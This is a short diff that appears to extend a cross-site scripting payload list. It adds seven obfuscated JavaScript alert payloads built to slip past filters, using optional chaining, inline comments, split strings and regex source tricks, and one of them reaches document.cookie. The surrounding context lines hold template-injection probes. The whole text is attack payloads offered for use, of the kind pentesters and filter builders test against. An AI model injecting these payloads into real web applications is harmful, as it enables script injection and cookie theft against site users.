@@ -1,3 +1,10 @@
+alert ?. (document ?. cookie)
+self?.['al'+'ert'/* foo bar */]?.('XSS')
+true in alert /* foo */ ?. /* bar */ (/XSS/)
+1 * alert ?. (/* foo */'XSS'/* bar */)
+true, alert ?. (...[/XSS/])
+true in self ?. [/alert/.source](/XSS/)
+self ?. [/alert/ ?. source ?. toString()](/XSS/)
 ">{{7*7}}<img>
 {{constructor.constructor('alert(`XSS`)')()}}
 window.alert?.()
